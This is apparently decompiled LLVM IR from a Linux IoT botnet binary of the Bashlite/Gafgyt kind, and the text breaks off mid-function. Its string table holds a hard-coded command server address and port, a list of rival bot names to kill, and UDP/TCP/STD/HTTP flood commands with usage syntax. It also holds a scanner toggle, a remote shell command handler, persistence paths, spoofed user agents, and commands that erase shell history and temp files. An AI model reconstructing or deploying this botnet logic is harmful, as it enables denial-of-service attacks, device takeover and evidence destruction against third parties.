@global_var_805724a.318 = constant [8 x i8] c"hackmy*\00"
@global_var_8057252.319 = constant [5 x i8] c"arm*\00"
@global_var_8057257.320 = constant [3 x i8] c"b1\00"
@global_var_805725a.321 = constant [3 x i8] c"b2\00"
@global_var_805725d.322 = constant [3 x i8] c"b3\00"
@global_var_8057260.323 = constant [3 x i8] c"b4\00"
@global_var_8057263.324 = constant [3 x i8] c"b5\00"
@global_var_8057266.325 = constant [3 x i8] c"b6\00"
@global_var_8057269.326 = constant [3 x i8] c"b7\00"
@global_var_805726c.327 = constant [3 x i8] c"b8\00"
@global_var_805726f.328 = constant [3 x i8] c"b9\00"
@global_var_8057272.329 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_8057283.330 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_805728c.331 = constant [10 x i8] c"dvrHelper\00"
@global_var_8057296.332 = constant [8 x i8] c"FDFDHFC\00"
@global_var_805729e.333 = constant [5 x i8] c"FEUB\00"
@global_var_80572a3.334 = constant [9 x i8] c"FTUdftui\00"
@global_var_80572ac.335 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_80572b5.336 = constant [6 x i8] c"jhUOH\00"
@global_var_80572bb.337 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_80572c4.338 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_80572ce.339 = constant [10 x i8] c"kmyx86_64\00"
@global_var_80572d8.340 = constant [10 x i8] c"lolmipsel\00"
@global_var_80572e2.341 = constant [8 x i8] c"RYrydry\00"
@global_var_80572ea.342 = constant [5 x i8] c"tel*\00"
@global_var_80572ef.343 = constant [9 x i8] c"TwoFace*\00"
@global_var_80572f8.344 = constant [9 x i8] c"UYyuyioy\00"
@global_var_8057301.345 = constant [5 x i8] c"wget\00"
@global_var_8057306.346 = constant [7 x i8] c"x86_64\00"
@global_var_805730d.347 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_8057316.348 = constant [5 x i8] c"xxb*\00"
@global_var_805731e.349 = constant i32 3276849
@global_var_8057320.350 = constant i32 3342386
@global_var_8057322.351 = constant i32 3407923
@global_var_8057324.352 = constant i32 3473460
@global_var_8057326.353 = constant i32 3538997
@global_var_8057328.354 = constant i32 3604534
@global_var_805732a.355 = constant i32 3670071
@global_var_805732c.356 = constant i32 3735608
@global_var_805732e.357 = constant i32 808517689
@global_var_8057330.358 = constant [3 x i8] c"10\00"
@global_var_8057333.359 = constant [3 x i8] c"11\00"
@global_var_8057336.360 = constant [3 x i8] c"12\00"
@global_var_8057339.361 = constant [3 x i8] c"13\00"
@global_var_805733c.362 = constant [3 x i8] c"14\00"
@global_var_805733f.363 = constant [3 x i8] c"15\00"
@global_var_8057342.364 = constant [3 x i8] c"16\00"
@global_var_8057345.365 = constant [3 x i8] c"17\00"
@global_var_8057348.366 = constant [3 x i8] c"18\00"
@global_var_805734b.367 = constant [3 x i8] c"19\00"
@global_var_805734e.368 = constant [3 x i8] c"20\00"
@global_var_8057351.369 = constant [6 x i8] c"hackz\00"
@global_var_8057357.370 = constant [5 x i8] c"bin*\00"
@global_var_805735c.371 = constant [5 x i8] c"gtop\00"
@global_var_8057361.372 = constant [5 x i8] c"ftp*\00"
@global_var_8057366.373 = constant [6 x i8] c"tftp*\00"
@global_var_805736c.374 = constant [7 x i8] c"botnet\00"
@global_var_8057373.375 = constant [8 x i8] c"swatnet\00"
@global_var_805737b.376 = constant [8 x i8] c"ballpit\00"
@global_var_8057383.377 = constant [8 x i8] c"fucknet\00"
@global_var_805738b.378 = constant [9 x i8] c"cracknet\00"
@global_var_8057394.379 = constant [8 x i8] c"weednet\00"
@global_var_805739c.380 = constant [7 x i8] c"gaynet\00"
@global_var_80573a3.381 = constant [9 x i8] c"queernet\00"
@global_var_80573ac.382 = constant [8 x i8] c"ballnet\00"
@global_var_80573b4.383 = constant [5 x i8] c"unet\00"
@global_var_80573b9.384 = constant [7 x i8] c"yougay\00"
@global_var_80573c0.385 = constant [7 x i8] c"sttftp\00"
@global_var_80573c7.386 = constant [7 x i8] c"sstftp\00"
@global_var_80573ce.387 = constant [7 x i8] c"sbtftp\00"
@global_var_80573d5.388 = constant [6 x i8] c"btftp\00"
@global_var_80573db.389 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_80573e4.390 = constant [6 x i8] c"bruv*\00"
@global_var_80573ea.391 = constant [5 x i8] c"IoT*\00"
@global_var_80573ef.392 = constant [19 x i8] c"159.89.176.175:114\00"
@global_var_805b040.393 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057220.310, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057225.311, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805722c.312, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8057230.313, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057234.314, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8057239.315, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805723d.316, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805723d.316, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057242.317, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805724a.318, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057252.319, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057257.320, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805725a.321, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805725d.322, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057260.323, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057263.324, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057266.325, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057269.326, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805726c.327, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805726f.328, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8057272.329, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057283.330, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805728c.331, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057296.332, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805729e.333, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80572a3.334, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80572ac.335, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80572b5.336, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80572bb.337, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80572c4.338, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80572ce.339, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80572d8.340, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057220.310, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057225.311, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80572e2.341, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80572ea.342, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80572ef.343, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80572f8.344, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057301.345, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057306.346, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805730d.347, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057316.348, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805731b.15, i32 0, i32 0), i8* bitcast (i32* @global_var_805731e.349 to i8*), i8* bitcast (i32* @global_var_8057320.350 to i8*), i8* bitcast (i32* @global_var_8057322.351 to i8*), i8* bitcast (i32* @global_var_8057324.352 to i8*), i8* bitcast (i32* @global_var_8057326.353 to i8*), i8* bitcast (i32* @global_var_8057328.354 to i8*), i8* bitcast (i32* @global_var_805732a.355 to i8*), i8* bitcast (i32* @global_var_805732c.356 to i8*), i8* bitcast (i32* @global_var_805732e.357 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057330.358, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057333.359, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057336.360, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057339.361, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805733c.362, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805733f.363, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057342.364, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057345.365, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8057348.366, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805734b.367, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805734e.368, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057351.369, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057357.370, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805735c.371, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057361.372, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057366.373, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805736c.374, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057373.375, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805737b.376, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057383.377, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805738b.378, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057394.379, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805739c.380, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80573a3.381, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80573ac.382, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80573b4.383, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80573b9.384, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80573c0.385, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80573c7.386, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80573ce.387, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80573d5.388, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80573db.389, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80573e4.390, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80573ea.391, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_80573ef.392, i32 0, i32 0)]
@global_var_8058799.394 = constant i32 1768423458
@global_var_805879b.395 = constant [22 x i8] c"history -c;history -w\00"
@global_var_80587b1.396 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_80587cf.397 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_80587e4.398 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_8058824.399 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_8058864.400 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_80588f4.401 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_805892c.402 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_805894c.403 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_8058964.404 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_80589bc.405 = constant [7 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_80587e4.398, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_8058824.399, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_8058864.400, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_80588f4.401, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_805892c.402, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_805894c.403, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_8058964.404, i32 0, i32 0)]
@global_var_80589f0.409 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_8058a2e.410 = constant [6 x i8] c"PONG!\00"
@global_var_8058a34.411 = constant [6 x i8] c"TABLE\00"
@global_var_8058a3a.412 = constant [3 x i8] c"%d\00"
@global_var_8058a3d.413 = constant [8 x i8] c"SCANNER\00"
@global_var_8058a45.414 = constant [4 x i8] c"OFF\00"
@global_var_80617d0.415 = local_unnamed_addr global i32 0
@global_var_8058a49.416 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_8058a5a.417 = constant [3 x i8] c"ON\00"
@global_var_8058a5d.418 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_8058a77.419 = constant [8 x i8] c"REMOVER\00"
@global_var_8058a7f.420 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_8058a9c.421 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_8058aa8.422 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_8058ab9.423 = constant [4 x i8] c"UDP\00"
@global_var_8058ac0.424 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_8058b31.425 = constant [4 x i8] c"TCP\00"
@global_var_8058b38.426 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_8058bf2.427 = constant [5 x i8] c"HTTP\00"
@global_var_8058bf7.428 = constant [4 x i8] c"STD\00"
@global_var_8058bfb.429 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_8058c16.430 = constant [9 x i8] c"KILLATTK\00"
@global_var_8058c1f.431 = constant [11 x i8] c"Killed %d.\00"
@global_var_8058c2a.432 = constant [13 x i8] c"None Killed.\00"
@global_var_8058c37.433 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_805b19c.434 = local_unnamed_addr global i32 -1
@global_var_805b198.435 = global [19 x i8]* @global_var_80573ef.392
@global_var_8058c41.436 = constant [8 x i8] c"8.8.8.8\00"
@global_var_8058c49.437 = constant [16 x i8] c"/proc/net/route\00"
@global_var_8058c59.438 = constant [11 x i8] c"\0900000000\09\00"
@global_var_8058c64.440 = constant [6 x i8] c"ROOTS\00"
@global_var_8058c6a.441 = constant i32 1952788224
@global_var_8058c6b.442 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_8058c7e.443 = constant i32 1697579122
@global_var_8058c80.444 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_8058c8f.446 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_8058c97.447 = constant i32 1868955745
@global_var_8058c99.448 = constant [13 x i8] c"fork failed\0A\00"
@global_var_8058ca6.449 = constant [12 x i8] c"BUILD %s:%s\00"
@global_var_8058cb2.450 = constant [5 x i8] c"PONG\00"
@global_var_8058cb7.451 = constant [4 x i8] c"DUP\00"
@global_var_8058cbb.452 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_8058ccf.453 = constant [3 x i8] c"SH\00"
@global_var_8058cd2.454 = constant [8 x i8] c"%s 2>&1\00"
@global_var_8058cda.455 = constant [3 x i8] c"%s\00"
@global_var_8058cdd.456 = constant i32 32
@global_var_8061790.457 = local_unnamed_addr global i32 0
@global_var_805b298 = external local_unnamed_addr global i32
@global_var_805b300.460 = global i32 288
@global_var_805b350.461 = local_unnamed_addr global i32 272
@global_var_80617a0.463 = global i32 0
@global_var_805b2d4.464 = global i32 0
@global_var_805f564.465 = local_unnamed_addr global i32 0
@global_var_805f568.466 = local_unnamed_addr global i32 0
@global_var_805b2ec.467 = local_unnamed_addr global i32 2
@global_var_805b2bc.468 = global i32 0
@global_var_805b2b8.469 = global i32* @global_var_805b300.460
@global_var_80592e0.470 = constant i32 0
@global_var_80592f8.471 = constant [6 x i8] c"(nil)\00"
@global_var_80592fe.472 = constant [7 x i8] c"(null)\00"
@global_var_8059305.473 = constant i32 2949163
@global_var_8059372.475 = constant i32 327688
@global_var_805936a.476 = constant [8 x i8] c" +0-#'I\00"
@global_var_8059318.477 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8059355.478 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805934b.479 = constant i32 117506048
@global_var_805933c.480 = constant i32 331776
@global_var_80593c0.481 = constant [8 x i8] c"Success\00"
@global_var_8059396.482 = constant [15 x i8] c"Unknown error \00"
@global_var_805a2c0.483 = constant i32 65536
@global_var_805b500.484 = local_unnamed_addr global i32* @global_var_805a2c0.483
@global_var_8061580.485 = global i32 0
@global_var_8061584.486 = global i32 0
@global_var_80615a0.487 = global i32 0
@global_var_806176c.488 = global i32 0
@global_var_805b508.489 = global i32 0
@global_var_8061bf4.490 = local_unnamed_addr global i32 0
@global_var_8061be8.491 = global i32 0
@global_var_80617e0.492 = global i32 0
@global_var_805b3f0.493 = global i32 0
@global_var_806188c.495 = global i32 0
@global_var_8061890.496 = local_unnamed_addr global i32 0
@global_var_8061894.497 = global i32 0
@global_var_80618a0.498 = local_unnamed_addr global i32 0
@global_var_8061b94.499 = global i32 0
@global_var_8061bbc.500 = local_unnamed_addr global i32 0
@global_var_8061bac.501 = local_unnamed_addr global i32 0
@global_var_8061bb0.502 = local_unnamed_addr global i32 0
@global_var_8061bb4.503 = local_unnamed_addr global i32 0
@global_var_8061bb8.504 = local_unnamed_addr global i32 0
@global_var_8061bc4.505 = local_unnamed_addr global i32 0
@global_var_8061bd0.506 = local_unnamed_addr global i32 0
@global_var_8061bc8.507 = local_unnamed_addr global i32 0
@global_var_8061bd4.508 = local_unnamed_addr global i32 0
@global_var_8061ba8.509 = local_unnamed_addr global i32 0
@global_var_8061ba4.511 = local_unnamed_addr global i32 0
@global_var_8061bcc.512 = local_unnamed_addr global i32 0
@global_var_806189c.513 = local_unnamed_addr global i32 0
@global_var_805b408.514 = global i32 0
@global_var_805b420.516 = global i32 0
@global_var_805b438 = external global i32
@global_var_805b464.518 = global i32 -1726662223
@global_var_805b440.519 = local_unnamed_addr global i32* @global_var_805b464.518
@global_var_805b43c.520 = global i32* @global_var_805b464.518
@global_var_8059f34.521 = constant i32 0
@global_var_8059f20.522 = constant i32 0
@global_var_8059f48.523 = constant [3 x i8] c"-c\00"
@global_var_8059f50.524 = constant [3 x i8] c"sh\00"
@global_var_8059f4b.525 = constant [8 x i8] c"/bin/sh\00"
@global_var_805b4e0.526 = global i32 0
@global_var_8061784.527 = local_unnamed_addr global i32 0
@global_var_806178c.528 = local_unnamed_addr global i32 0
@global_var_805b000.530 = global i32 -1
@global_var_805430f.531 = constant i32 -294069
@global_var_8061794.532 = local_unnamed_addr global i32 0
@global_var_8061798.533 = local_unnamed_addr global i32 0
@global_var_805a1ac.534 = constant [10 x i8] c"/dev/null\00"
@global_var_8061788.536 = local_unnamed_addr global i32 0
@global_var_80544f5.538 = constant i32 1928542531
@global_var_8054519.539 = constant i32 1928542531
@global_var_80617c4.540 = local_unnamed_addr global i32 0
@global_var_80617a4.541 = global i32 0
@global_var_805a4d0.543 = constant [4 x i8] c"inf\00"
@global_var_805a4d3.548 = constant i32 1179535616
@global_var_805a4e0.549 = constant i32 2883630
@global_var_8061bf8.553 = local_unnamed_addr global i32 0
@global_var_805a59c.554 = constant i32 1697579054
@global_var_805a5d0.555 = constant i32 1868824690
@global_var_805a59e.556 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805a5af.557 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_805a5c7.558 = constant [11 x i8] c"nameserver\00"
@global_var_805a5d2.559 = constant [7 x i8] c"domain\00"
@global_var_805a5d9.560 = constant [7 x i8] c"search\00"
@global_var_8061bd8.561 = global i32 0
@global_var_8061bfc.562 = local_unnamed_addr global i32 0
@global_var_8061c00.563 = local_unnamed_addr global i32 0
@global_var_805a5f4.564 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_805a5f1.566 = constant [3 x i8] c"%x\00"
@global_var_805a605.567 = constant [11 x i8] c"/etc/hosts\00"
@global_var_805a610.568 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805b520.1 = local_unnamed_addr global i8 0
@global_var_805f560.13 = external local_unnamed_addr global i8*
@global_var_805b559.40 = local_unnamed_addr global i8 0
@global_var_805b55a.41 = local_unnamed_addr global i8 0
@global_var_805b550.439 = external global i8*
@1 = internal constant [2 x i8] c"/\00"
@global_var_8058c8d.445 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_805938a.474 = external constant i8*
@global_var_8061860.494 = global i8 0
@global_var_8061bc0.510 = local_unnamed_addr global i8 0
@global_var_8061780.515 = local_unnamed_addr global i8 0
@global_var_806179c.535 = local_unnamed_addr global i8 0
@global_var_80617a8.550 = external global i8*
@global_var_80617c0.551 = local_unnamed_addr global i64 0
@global_var_805b504.552 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 77687
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_805b520.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_805b024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_805b024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_805b024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805b520.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805b024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805b520.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805a624.4 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_805b010.6, align 16
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v4_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v4_8048166, i32* @ecx, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134543483, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134574600, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805b560.7, align 32
